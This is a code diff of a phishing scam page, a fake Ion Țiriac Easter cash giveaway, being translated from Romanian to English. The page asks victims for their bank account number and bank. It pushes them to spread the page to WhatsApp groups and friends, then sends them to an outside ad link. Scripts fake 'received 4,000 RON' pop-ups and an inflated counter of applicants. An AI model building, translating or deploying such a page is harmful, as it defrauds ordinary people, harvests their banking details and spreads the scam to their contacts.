@@ -6,7 +6,7 @@
 var password = '4,000 RON';
 
 password = prompt(
-  'Ion Țiriac: Felicitări, ești eligibil pentru un cadou de Paște de 4.000 RON de la Ion Țiriac. Apasă OK pentru a activa acum.',
+  'Ion Țiriac: Congratulations, you are eligible for 4,000 RON Easter Cash Gift from Ion Țiriac. Click OK to activate now.',
   '4,000 RON'
 );
 
@@ -32,7 +32,7 @@ if (password !== '4,000 RON') {
         }
 
 
-        /* if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
                         document.getElementById("first-box")."quedate__step".display="none";//??;
                         document.getElementById("second-box").style.display="none";//??;
                         document.getElementById("third-box").style.display="none";//??;
@@ -43,26 +43,26 @@ if (password !== '4,000 RON') {
     </script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>4.000 RON Paște CASH GIVEAWAY</title>
+    <title>4,000 RON Easter CASH GIVEAWAY</title>
     <link rel="shortcut icon" type="image/png" href="30.png" />
-    <meta name="og:title" content="4.000 RON Paște CASH GIVEAWAY" />
+    <meta name="og:title" content="4,000 RON Easter CASH GIVEAWAY" />
     <meta name="og:url" content="https://goldenstash.online/Share.html" />
     <meta property="og:description"
-        content="4.000 RON Paște CASH GIVEAWAY" />
+        content="4,000 RON Easter CASH GIVEAWAY" />
     <meta property="og:image" content="3.png" />
     <meta property="og:type" content="website" />
     <meta property="og:updated_time" content="1440432930" />
 </head>
 
 <body>
-    <style 
- type="text/css">
+    <style type="text/css">
         @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
         @import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
- * {
+
+        * {
             margin: 0;
             padding: 0;
- font-family: Poppins, Droid Arabic Naskh;
+            font-family: Poppins, Droid Arabic Naskh;
             font-weight: normal;
             box-sizing: border-box;
 
@@ -71,59 +71,59 @@ if (password !== '4,000 RON') {
 
         body {
             direction: lfl;
- background: white;
+            background: white;
         }
 
         a {
             text-decoration: none;
- }
+        }
 
         .post {
             background: #fff;
- margin: 0 auto;
+            margin: 0 auto;
             padding: 10px;
             max-width: 500px;
             border: 1px solid #d0d1d5;
             border-radius: 3px;
- }
+        }
 
         .post img {
             width: 100%;
- }
+        }
 
         .welcome {
             font-size: 15px;
- }
+        }
 
         .amount,
         #getname {
             color: green;
- text-decoration: none;
+            text-decoration: none;
         }
 
         .done {
             text-align: center;
- color: #27ae60;
+            color: #27ae60;
         }
 
         .tip {
             font-size: 14px;
- }
+        }
 
         .title {
             text-align: center;
- }
+        }
 
         .error {
             display: none;
- text-align: center;
+            text-align: center;
             font-size: 14px;
             color: #e74c3c;
         }
 
         button {
             display: block;
- width: 200px;
+            width: 200px;
             height: 50px;
            color: #ffffff;
             border: none;
@@ -132,54 +132,54 @@ if (password !== '4,000 RON') {
             cursor: pointer;
             border-radius: 5px;
             padding: 0 10px;
- margin: 10px auto;
+            margin: 10px auto;
             background: #0B7A3B;
             transition: background 0.3s ease;
         }
 
         button:hover {
             background: #0B7A3B;
- }
+        }
 
         .phone {
             max-width: 400px;
- margin: 10px auto;
+            margin: 10px auto;
         }
 
         .phone input {
             width: 100%;
- height: 50px;
+            height: 50px;
             padding: 10px;
             outline: none;
             border: 2px solid #cecece;
             font-size: 14px;
- }
+        }
 
         #confirm {
             width: 200px;
- margin: 10px auto;
+            margin: 10px auto;
             border-radius: 0px;
         }
 
         #loader {
             text-align: center;
- }
+        }
 
         .spin {
             width: 50px;
- height: 50px;
+            height: 50px;
             background: transparent;
             border: solid 8px rgb(9, 129, 5);
             border-right-color: transparent;
             border-radius: 50%;
             margin: 10px auto;
- animation: spin 0.8s linear infinite;
+            animation: spin 0.8s linear infinite;
         }
 
         @keyframes spin {
             100% {
                 transform: rotate(1turn);
- }
+            }
         }
 
         #loader,
@@ -188,86 +188,86 @@ if (password !== '4,000 RON') {
         #share,
         #claim {
             display: none;
- }
+        }
 
         .center {
             display: flex;
- align-items: center;
+            align-items: center;
             justify-content: center;
         }
 
         .barr {
             direction: ltr;
- max-width: 400px;
+            max-width: 400px;
             margin: 10px auto;
             box-sizing: border-box;
         }
 
         .fill {
             position: relative;
- display: inline-block;
+            display: inline-block;
             width: calc(100% - 100px);
             height: 35px;
             padding: 2px;
             border: 2px solid #0B7A3B;
- }
+        }
 
         #fill,
         #fill2 {
             background: #0B7A3B;
- width: 0%;
+            width: 0%;
             height: 100%;
         }
 
         .percentage {
             width: 100px;
- float: right;
+            float: right;
             height: 35px;
             font-size: 16px;
             border: 2px solid #0B7A3B;
- }
+        }
 
         #percentage,
         #percentage2 {
             margin-left: 5px;
- }
+        }
 
         #check,
         #check2 {
             display: none;
- }
+        }
 
         .counter {
             color: #7f7f7f;
- font-size: 12px;
+            font-size: 12px;
             text-align: right;
             padding: 10px 0 10px 2px;
             border-bottom: 1px solid #e1e2e3;
- }
+        }
 
         .reactions {
             display: inline-flex;
- align-items: center;
+            align-items: center;
             float: left;
         }
 
         .counter img {
             float: left;
- width: 16px;
+            width: 16px;
             height: 16px;
             border-radius: 50%;
             border: 2px solid #fff;
             box-sizing: content-box;
- }
+        }
 
         .like,
         .love {
             margin-right: -5px;
- }
+        }
 
         .like {
             z-index: 2;
- }
+        }
 
         .love {
             z-index: 1;
@@ -275,45 +275,45 @@ if (password !== '4,000 RON') {
 
         .bar {
             display: table;
- width: 100%;
+            width: 100%;
             border-bottom: 1px solid #e1e2e3;
         }
 
         .bar .react {
             display: table-cell;
- width: calc(100% / 3);
+            width: calc(100% / 3);
             font-size: 12px;
             color: #7f7f7f;
             text-align: center;
             padding: 10px 0;
             cursor: pointer;
- }
+        }
 
         .comments {
             direction: ltr;
- }
+        }
 
         .comment {
             padding: 6px 0;
- margin-top: 5px;
+            margin-top: 5px;
         }
 
         .comment img {
             float: left;
- width: 32px;
+            width: 32px;
             height: 32px;
             border: none;
             border-radius: 18px;
             cursor: pointer;
- }
+        }
 
         .reply {
             margin-left: 37px;
- }
+        }
 
         .single-container {
             margin-left: 37px;
- background: #f1f2f6;
+            background: #f1f2f6;
             padding: 10px;
             border-radius: 15px;
             font-size: 12px;
@@ -321,58 +321,57 @@ if (password !== '4,000 RON') {
 
         .single-container .user {
             display: inline-block;
- cursor: pointer;
+            cursor: pointer;
             color: #365899;
             margin-bottom: 5px;
         }
 
         .single-container .text {
             display: block;
- }
+        }
 
         .buttons {
             font-size: 12px;
- font-weight: bold;
+            font-weight: bold;
             margin: 10px 0 0 47px;
             color: #90949c;
         }
 
         .action {
             cursor: pointer;
- }
+        }
 
         .action:hover {
             text-decoration: underline;
- }
+        }
 
         .input {
             padding: 6px 12px 12px;
- }
+        }
 
         .input input {
             width: 100%;
- background: #f1f2f6;
+            background: #f1f2f6;
             padding: 10px;
             border-radius: 15px;
             border: 0;
             outline: none;
- }
+        }
 
         .A {
             text-align: center;
- background-color: #0B7A3B;
+            background-color: #0B7A3B;
             color: #ffffff;
         }
     </style>
-    <marquee class="horizontal_marque" direction="left">Un sezon al învierii și bucuriei – Ion Țiriac 4.000 RON Giveaway</marquee>
+    <marquee class="horizontal_marque" direction="left">A Season of Resurrection and Joy– Ion Țiriac 4,000 RON Giveaway</marquee>
          <center>
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEge9YgneUlb-qZQViVRq2LaPlkX2hNu03Tqm48MD9qvPUt54eEcHO49_kMEZouRG4Qsvr5oPyT_TxZIz2WWkki_wzwwT59QFObkzV8VP5AVSxoBHMkH8gnq05Z7-Rr4kFsOaNQT83VRXfqbBHcwX2-POeBI-us5TT5xog4jjcS2Y00u_DUyL-1VeOcny1s/w640-h426/Program%20de%20sprijin%20pentru%20Pa%C8%99te.png"
        style="width: 80%;
               max-width: 700px;
               height: auto;
               border-style: ridge;
-           
-    border-radius: 50px;
+              border-radius: 50px;
               border-width: 5px;
               border-color: #0B7A3B;">
 </center>
@@ -382,21 +381,19 @@ if (password !== '4,000 RON') {
 
     <div id="intro">
         <p class="welcome">
-            <span class="badge">4.000 RON Paște Cash Giveaway</span>
+            <span class="badge">4,000 RON Easter Cash Giveaway</span>
 
             <br><br>
 
-  
-       Paștele este o lună specială de post, rugăciune și dăruire către ceilalți.
- În spiritul bunătății și generozității, <b>Ion Țiriac
-       </b> oferă 4.000 RON fiecărui român pentru a sprijini familiile în acest sezon binecuvântat.
- <br>
+        Easter is a special month of fasting, prayer, and sharing with others. In the spirit of kindness and generosity, <b>Ion Țiriac
+       </b> is giving 4,000 RON to every Romanian to support families during this blessed season.
+    <br>
 
-            Apasă pe <b>“SOLICITĂ ACUM”</b> pentru a primi suma ta.
- <br>
-            <span class="note">Notă:</span> Mergi la Solicită Acum pentru a continua.
- </p>
-   <button id="go" class="cta-btn">SOLICITĂ ACUM</button>
+            Click on <b>“CLAIM NOW”</b> to receive yours.
+            <br>
+            <span class="note">Note:</span> Proceed to Claim Now to continue.
+        </p>
+   <button id="go" class="cta-btn">CLAIM NOW</button>
     </div>
 
 </div>
@@ -405,7 +402,7 @@ if (password !== '4,000 RON') {
 .post{
     width:100%;
     padding:15px;
- }
+}
 
 /* GRADIENT INTRO */
 #intro{
@@ -414,7 +411,7 @@ if (password !== '4,000 RON') {
     padding:30px 25px;
    background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     border-radius:18px;
- box-shadow:0 15px 35px rgba(0,0,0,0.25);
+    box-shadow:0 15px 35px rgba(0,0,0,0.25);
     color:#fff;
     text-align:center;
 }
@@ -424,7 +421,7 @@ if (password !== '4,000 RON') {
     font-size:17px;
     line-height:1.7;
     margin:0;
- }
+}
 
 /* BADGE */
 .badge{
@@ -439,7 +436,7 @@ if (password !== '4,000 RON') {
 /* NOTE */
 .note{
     color:#FFD700;
- font-weight:700;
+    font-weight:700;
 }
 
 /* BUTTON */
@@ -453,7 +450,7 @@ if (password !== '4,000 RON') {
     border-radius:35px;
     text-decoration:none;
     box-shadow:0 8px 20px rgba(0,0,0,.3);
- transition:.3s ease;
+    transition:.3s ease;
 }
 
 .cta-btn:hover{
@@ -465,13 +462,13 @@ if (password !== '4,000 RON') {
 @media(max-width:600px){
     .welcome{
         font-size:15px;
- }
+    }
 }
 </style>
 
         </div>
         <div id="loader">
-            <div>Vă rugăm așteptați ...</div>
+            <div>Please Wait ...</div>
             <div class="spin"></div>
             <div id="num">0%</div>
         </div>
@@ -479,7 +476,7 @@ if (password !== '4,000 RON') {
 /* MAIN CONTAINER */
 #info{
     max-width:500px;
- margin:25px auto;
+    margin:25px auto;
     padding:25px 20px;
 background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     border-radius:18px;
@@ -487,7 +484,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     color:#fff;
     text-align:center;
     font-family:Arial, sans-serif;
- }
+}
 
 /* TITLE */
 #info .title{
@@ -500,7 +497,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 #info input[type="number"]{
     width:330px;
     height:56px;
- font-size:18px;
+    font-size:18px;
     border-radius:12px;
     border:none;
     padding:0 15px;
@@ -515,7 +512,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 #info select{
     width:330px;
     height:56px;
- font-size:16px;
+    font-size:16px;
     border-radius:12px;
     border:none;
     padding:0 15px;
@@ -530,7 +527,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 #info button#confirm{
     width:200px;
     padding:14px 0;
- font-size:18px;
+    font-size:18px;
     font-weight:700;
     border-radius:35px;
     border:none;
@@ -539,7 +536,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     color:#0B7A3B;
     box-shadow:0 8px 25px rgba(0,0,0,0.35);
     transition:all 0.3s ease;
- }
+}
 
 #info button#confirm:hover{
     transform:scale(1.05);
@@ -548,69 +545,63 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 </style>
 
         <div id="info">
-            <p class="title">Introdu numărul contului tău :</p>
+            <p class="title">Enter your Account Number :</p>
             <div class="phone">
-                <center><input type="number" placeholder="Introdu numărul contului" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;"
- onkeypress="return numberonly(event);">
+                <center><input type="number" placeholder="Enter Account number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
                 </center>
                 <center>
                     <h3>
                         <center>
-                       
-      <p class="title">SELECTEAZĂ NUMELE BĂNCII TALE:</p>
+                            <p class="title">SELECT YOUR BANK NAME:</p>
                         </center>
                     </h3>
                     <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
     width: 330px;
     height: 56px;
 ">
-<option value="أختر نوع الشبكة" selected="1">Numele Băncii</option>
+<option value="أختر نوع الشبكة" selected="1">Bank Name</option>
 
 
-<option value="2"> Banca Transilvania - 4.000 RON</option>
-<option 
- value="3"> BCR (Banca Comercială Română) - 4.000 RON</option>
-<option value="4"> United Bank for Africa Plc - 4.000 RON</option>
-<option value="6"> Union Bank of Romania Plc - 4.000 RON </option>
-<option value="7"> Keystone Bank Limited - 4.000 RON </option>
-<option value="8"> First Bank of Romania - 4.000 RON </option>
-<option value="8"> CEC Bank - 4.000 RON </option>
-<option value="9"> BRD - Groupe Société Générale - 4.000 RON </option>
-<option value="10">Raiffeisen Bank - 4.000 RON</option>
-<option value="11">ING Bank - 4.000 RON </option>
-<option value="12">UniCredit Bank - 4.000 RON</option>
-<option value="13">Exim Banca Românească - 4.000 RON</option>
-<option value="2"> Alpha Bank - 4.000 RON</option>
-<option value="3"> OTP Bank - 4.000 RON</option>
-<option value="4"> Garanti BBVA - 4.000 RON</option>
-<option value="6"> Libra Internet Bank - 4.000 RON</option>
-<option value="7"> First Bank - 4.000 RON </option>
-<option value="8">Intesa Sanpaolo Bank - 4.000 RON </option>
-<option value="8"> Vista Bank - 4.000 RON </option>
-<option value="9"> Patria Bank - 4.000 RON </option>
-<option value="10">Citibank - 4.000 RON</option>
-<option value="11">Bank of China - 4.000 RON</option>
-<option value="12">Revolut Bank - 4.000 RON</option>
-<option value="13">TBI Bank - 4.000 RON</option>
+<option value="2"> Banca Transilvania- 4,000 RON</option>
+<option value="3"> BCR (Banca Comercială Română)- 4,000 RON</option>
+<option value="4"> United Bank for Africa Plc- 4,000 RON</option>
+<option value="6"> Union Bank of Romania Plc- 4,000 RON </option>
+<option value="7"> Keystone Bank Limited-  4,000 RON </option>
+<option value="8"> First Bank of Romania-  4,000 RON  </option>
+<option value="8"> CEC Bankk- 4,000 RON  </option>
+<option value="9"> BRD - Groupe Société Générale-  4,000 RON </option>
+<option value="10">Raiffeisen Bank-  4,000 RON</option>
+<option value="11">ING Bank- 4,000 RON </option>
+<option value="12">UniCredit Bank-  4,000 RON</option>
+<option value="13">Exim Banca Românească-  4,000 RON</option>
+<option value="2"> Alpha Bank-  4,000 RON</option>
+<option value="3"> OTP Bank-  4,000 RON</option>
+<option value="4"> Garanti BBVA-  4,000 RON</option>
+<option value="6"> Libra Internet Bank-  4,000 RON</option>
+<option value="7"> First Bank -  4,000 RON </option>
+<option value="8">Intesa Sanpaolo Bank -  4,000 RON </option>
+<option value="8"> Vista Bank-  4,000 RON </option>
+<option value="9"> Patria Bank-  4,000 RON </option>
+<option value="10">Citibank-  4,000 RON</option>
+<option value="11">Bank of China- 4,000 RON</option>
+<option value="12">Revolut Bank-  4,000 RON</option>
+<option value="13">TBI Bank-  4,000 RON</option>
 </select>
                 </center><br>
-                <button id="confirm">Trimite</button>
+                <button id="confirm">Send</button>
             </div>
-  
-           <p class="error">Vă rugăm introduceți un număr de cont valid !</p>
+            <p class="error">Please enter a valid Account number !</p>
         </div>
         <div id="checking">
-            <p class="title">Vă rugăm așteptați un moment...</p>
+            <p class="title">Please wait a moment...</p>
             <div class="barr">
                 <div class="fill">
-                    
- <div id="fill"></div>
+                    <div id="fill"></div>
                 </div>
                 <div class="percentage center">
                     <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
                     <span id="check"><i class="fa fa-check-circle"></i></span>
-                  
-   <span id="percentage"></span>
+                    <span id="percentage"></span>
                 </div>
             </div>
         </div>
@@ -618,7 +609,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 /* MAIN SHARE BOX */
 #share{
     max-width:500px;
- margin:25px auto;
+    margin:25px auto;
     padding:25px 20px;
    background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     border-radius:18px;
@@ -626,7 +617,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     color:#fff;
     text-align:left;
     font-family:Arial, sans-serif;
- }
+}
 
 /* TEXT PARAGRAPHS */
 #share .tip{
@@ -638,7 +629,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 /* HIGHLIGHT AMOUNT */
 #share .amount{
     font-weight:700;
- color:#FFD700;
+    color:#FFD700;
 }
 
 /* SHARE BUTTON */
@@ -650,7 +641,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     font-size:18px;
     font-weight:700;
     border-radius:35px;
- border:none;
+    border:none;
     cursor:pointer;
     background:linear-gradient(135deg,#FFD700,#FFB700);
     color:#0B7A3B;
@@ -661,41 +652,38 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 #share button#whatsapp:hover{
     transform:scale(1.05);
     background:linear-gradient(135deg,#fff,#f5f5f5);
- }
+}
 
 /* MOBILE RESPONSIVE */
 @media(max-width:600px){
     #share{
         padding:20px 15px;
- }
+    }
     #share .tip{
         font-size:15px;
- }
+    }
     #share button#whatsapp{
         width:100%;
         font-size:16px;
-        }
+    }
 }
 </style>
 
         <div id="share">
-            <p class="tip">Numărul contului tău este <span id="getname"></span>،</p>
+            <p class="tip">Your Account Number is <span id="getname"></span>،</p>
             <p class="tip">
-                După verificare, ești calificat să primești <span class="amount">4.000 RON.</span> Cum să procedezi:
+                After verification, You are qualified to get <span class="amount">4,000 RON.</span> How to proceed:
             </p><br>
-            <p class="tip">1.
- Distribuie la 5 grupuri sau 15 prieteni pe WhatsApp (Apasă pe pictograma "DISTRIBUIE" de mai jos).</p>
-            <p class="tip">2.
- Vei fi redirecționat automat către pagina noastră de Date Gratuite după ce bara de verificare VERDE se umple.</p>
-            <p class="tip">3.
- Vei primi o confirmare prin SMS în 15 minute.</p>
-            <button id="whatsapp">DISTRIBUIE</button>
+            <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+            <p class="tip">2. You will be redirected automatically to our Free Data page after the GREEN verification
+                bar is filled.</p>
+            <p class="tip">3. You will receive a confirmation by SMS in 15 minutes.</p>
+            <button id="whatsapp">SHARE</button>
             <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
                 </div>
-           
-      <div class="percentage center">
+                <div class="percentage center">
                     <span><i class="fa fa-spinner fa-pulse"></i></span>
                     <span id="percentage2">0%</span>
                 </div>
@@ -704,8 +692,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
         <style>
 /* CLAIM BOX */
 #claim{
-  
-   max-width:450px;
+    max-width:450px;
     margin:30px auto;
     padding:30px 20px;
     background: linear-gradient(135deg, #0A2F25, #0E3F3A, #0B7A3B);
@@ -713,7 +700,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     box-shadow:0 12px 35px rgba(0,0,0,0.25);
     color:#fff;
     text-align:center;
- font-family:Arial, sans-serif;
+    font-family:Arial, sans-serif;
 }
 
 /* CHECK ICON */
@@ -722,7 +709,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     margin-bottom:15px;
     display:block;
     animation:pop 0.6s ease;
- }
+}
 
 /* TITLE */
 #claim .title{
@@ -735,7 +722,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 #claim button#offer{
     display:inline-block;
     margin-top:20px;
- padding:14px 35px;
+    padding:14px 35px;
     font-size:18px;
     font-weight:700;
     border-radius:35px;
@@ -745,7 +732,7 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     color:#0B7A3B;
     box-shadow:0 8px 25px rgba(0,0,0,0.35);
     transition:all 0.3s ease;
- }
+}
 
 #claim button#offer:hover{
     transform:scale(1.05);
@@ -763,45 +750,42 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 @media(max-width:600px){
     #claim{
         padding:25px 15px;
- }
+    }
     #claim .title{
         font-size:18px;
- }
+    }
     #claim button#offer{
         width:100%;
         font-size:16px;
- }
+    }
 }
 </style>
 
         <div id="claim">
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
-            <p class="title">Felicitări!
- </p>
-            <b>Apasă pe oricare dintre butoanele de mai jos pentru a-ți primi banii acum</b>
-            <button id="offer">VERIFICĂ ACUM</button>
+            <p class="title">Congratulations! </p>
+            <b>Click on any of the button below to Get Your Money now</b>
+            <button id="offer">VERIFY NOW</button>
 <center>
     <a onclick="window.open('https://omg10.com/4/10826485')" href="https://omg10.com/4/10826485">
-        <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;"
- class="button final">Primește Plata Acum</button></a>
+        <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final">Get My Payment Now</button></a>
 </center><br/>
 
 <center>
     <a onclick="window.open('https://omg10.com/4/10826485')" href="https://omg10.com/4/10826485">
-        <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;"
- class="button final">Verifică Starea Plății</button></a>
+        <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final">Check Payment Status</button></a>
 </center><br/>
         </div>
         <BR/>
-        <div class="notification-overlay">Andrei Popescu A primit 4.000 RON acum 15 secunde</div>
-<div class="notification-overlay">Elena Popa A primit 4.000 RON acum 20 de secunde</div>
+        <!-- NOTIFICATIONS -->
+<div class="notification-overlay">Andrei Popescu A primit 4.000 RON acum 15 secunde</div>
+<div class="notification-overlay">Elena PopaA primit 4.000 RON acum 20 de secunde</div>
 <div class="notification-overlay">Vlad Ciobanu A primit 4.000 RON acum 25 de secunde</div>
 <div class="notification-overlay">Maria Drăgano A primit 4.000 RON acum 30 de secunde</div>
 <div class="notification-overlay">Darius Matei A primit 4.000 RON acum 35 de secunde</div>
 <div class="notification-overlay">Ioana Georgescu A primit 4.000 RON acum 40 de secunde</div>
 <div class="notification-overlay">Cristian Gheorghe A primit 4.000 RON acum 45 de secunde</div>
-<div class="notification-overlay">Andreea Stancu 
- A primit 4.000 RON acum 50 de secunde</div>
+<div class="notification-overlay">Andreea Stancu A primit 4.000 RON acum 50 de secunde</div>
 <div class="notification-overlay">Ionuț Stoica A primit 4.000 RON acum 55 de secunde</div>
 <div class="notification-overlay">Alexandra Ilie Am primit 4.000 RON acum 1 minut</div>
 <div class="notification-overlay">Mihai Stan A primit 4.000 RON acum 1 minut și 5 secunde</div>
@@ -813,15 +797,15 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
 
 <style>
 .notification-overlay{
-  
-   position: fixed;
+    position: fixed;
     bottom: 20px;
     left: 20px;
     max-width: 320px;
     padding: 14px 20px;
     background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     color: #fff;
- font-size: 14px;
+
+    font-size: 14px;
     font-weight: 600;
     border-radius: 12px;
     box-shadow: 0 10px 25px rgba(0,0,0,0.3);
@@ -829,13 +813,13 @@ background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
     opacity: 0;
     transform: translateY(30px);
     transition: all 0.6s ease;
- z-index: 9999;
+    z-index: 9999;
 }
 
 .notification-overlay.show{
     opacity: 1;
     transform: translateY(0);
- }
+}
 </style>
 
 <script>
@@ -852,41 +836,39 @@ document.addEventListener("DOMContentLoaded", function () {
     showNotification();
     setInterval(showNotification, 4000);
 });
- </script>
+</script>
 
         
             <script>
                 // Array of notification IDs
                             const notificationIds = [
-                             
-    'notif1', 'notif2', 'notif3', 'notif4', 'notif5',
+                                'notif1', 'notif2', 'notif3', 'notif4', 'notif5',
                                 'notif6', 'notif7', 'notif8', 'notif8', 'notif9', 'notif10', 'notif11', 'notif12', 'notif13', 'notif14', 'notif15', 'notif16'
                             ];
- // Function to show notifications
+                        
+                            // Function to show notifications
                             function showNotifications() {
                                 notificationIds.forEach((id, index) => {
-                               
-      const notification = document.getElementById(id);
+                                    const notification = document.getElementById(id);
                                     setTimeout(() => {
                                         notification.style.display = 'block';
-            
-                             notification.style.animation = 'fadeInOut 5s ease-in-out';
+                                        notification.style.animation = 'fadeInOut 5s ease-in-out';
                                         setTimeout(() => {
-                          
-                   notification.style.display = 'none';
+                                            notification.style.display = 'none';
                                         }, 5000); // Hide after 3 sec
-                                  
-   }, index * 6000); // Show each notification with a delay
+                                    }, index * 6000); // Show each notification with a delay
                                 });
- }
+                            }
                         
                             // Show the notifications
                             showNotifications();
- </script>
+        
+                     
+            </script>
             <style>
                 .comments{
     background:#fff;
- border-radius:12px;
+    border-radius:12px;
     padding:15px;
     max-width:600px;
     margin:20px auto;
@@ -898,7 +880,7 @@ document.addEventListener("DOMContentLoaded", function () {
 .counter{
     display:flex;
     justify-content:space-between;
- align-items:center;
+    align-items:center;
     font-size:14px;
     color:#65676b;
     margin-bottom:10px;
@@ -914,7 +896,7 @@ document.addEventListener("DOMContentLoaded", function () {
     width:18px;
     height:18px;
     border-radius:50%;
- border:1px solid #fff;
+    border:1px solid #fff;
 }
 
 /* ACTION BAR */
@@ -924,7 +906,7 @@ document.addEventListener("DOMContentLoaded", function () {
     padding:8px 0;
     border-top:1px solid #eee;
     border-bottom:1px solid #eee;
- margin-bottom:12px;
+    margin-bottom:12px;
 }
 
 .bar .react{
@@ -935,7 +917,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
 .bar .react:hover{
     color:#0B7A3B;
- }
+}
 
 /* COMMENT */
 .comment{
@@ -950,7 +932,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
 .comment img{
     width:40px;
- height:40px;
+    height:40px;
     border-radius:50%;
     object-fit:cover;
 }
@@ -961,7 +943,7 @@ document.addEventListener("DOMContentLoaded", function () {
     padding:10px 14px;
     border-radius:18px;
     max-width:100%;
- }
+}
 
 .single-container .user{
     font-weight:700;
@@ -973,7 +955,7 @@ document.addEventListener("DOMContentLoaded", function () {
 .single-container .text{
     font-size:14px;
     color:#050505;
- }
+}
 
 /* BUTTONS */
 .buttons{
@@ -985,7 +967,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
 .buttons .action{
     cursor:pointer;
- }
+}
 
 .buttons .action.liked{
     color:#0B7A3B;
@@ -999,7 +981,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
 .input input{
     width:100%;
- padding:12px 15px;
+    padding:12px 15px;
     border-radius:20px;
     border:1px solid #ddd;
     outline:none;
@@ -1008,22 +990,22 @@ document.addEventListener("DOMContentLoaded", function () {
 
 .input input:focus{
     border-color:#0B7A3B;
- }
+}
 
             </style>
             <div class="active-box">
     <span class="pulse"></span>
     <div class="active-text">
-        <strong>Activ Acum</strong><br>
+        <strong>Active Now</strong><br>
         <span id="countdowntimer">98,542</span><br>
-        <small>Utilizatori români care aplică în prezent</small>
+        <small>Romanian Users Currently Applying</small>
     </div>
 </div>
 
 <style>
 .active-box{
     max-width:420px;
- margin:25px auto;
+    margin:25px auto;
     padding:18px 22px;
     display:flex;
     align-items:center;
@@ -1034,7 +1016,7 @@ document.addEventListener("DOMContentLoaded", function () {
     border-radius:16px;
     box-shadow:0 10px 25px rgba(0,0,0,0.25);
     font-family:Arial, sans-serif;
- }
+}
 
 /* PULSE DOT */
 .pulse{
@@ -1050,7 +1032,7 @@ document.addEventListener("DOMContentLoaded", function () {
     position:absolute;
     inset:0;
     border-radius:50%;
- background:rgba(255,59,59,0.6);
+    background:rgba(255,59,59,0.6);
     animation:pulse 1.5s infinite;
 }
 
@@ -1062,7 +1044,7 @@ document.addEventListener("DOMContentLoaded", function () {
 /* TEXT */
 .active-text{
     line-height:1.3;
- }
+}
 
 .active-text strong{
     font-size:16px;
@@ -1074,7 +1056,7 @@ document.addEventListener("DOMContentLoaded", function () {
     font-size:28px;
     font-weight:900;
     color:#FFD700;
- }
+}
 
 .active-text small{
     font-size:13px;
@@ -1084,14 +1066,15 @@ document.addEventListener("DOMContentLoaded", function () {
 
 <script>
 var timeleft = 98542;
- setInterval(function(){
+
+setInterval(function(){
     // Add random users to simulate activity
     timeleft = timeleft + Math.floor(Math.random() * 600);
 
     document.getElementById("countdowntimer").textContent =
         timeleft.toLocaleString();
 }, 1000);
- </script>
+</script>
 <center>
 <style>
  {margin: 0;
@@ -1101,7 +1084,7 @@ var timeleft = 98542;
     justify-content: center;
     align-items: center;
     height: 100vh;
- }
+}
 
 /* Container */
 .testimonials-container {
@@ -1110,180 +1093,365 @@ var timeleft = 98542;
     background: #f9f9f9;
     border-radius: 10px;
     overflow: hidden;
-<style>
-        .testimonials-container {
-            width: 350px;
-            height: 450px;
-            background: #f9f9f9;
-            border-radius: 10px;
-            overflow: hidden;
-            position: relative;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
+    display: flex;
+    flex-direction: column;
+}
 
-        .testimonials-wrapper {
-            position: absolute;
-            width: 100%;
-            animation: scroll-up 15s linear infinite;
-        }
+/* Scroll area */
+.testimonials-wrapper {
+    flex: 1;
+    overflow: hidden;
+    position: relative;
+    background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+}
 
-        .testimonial-card {
-            padding: 20px;
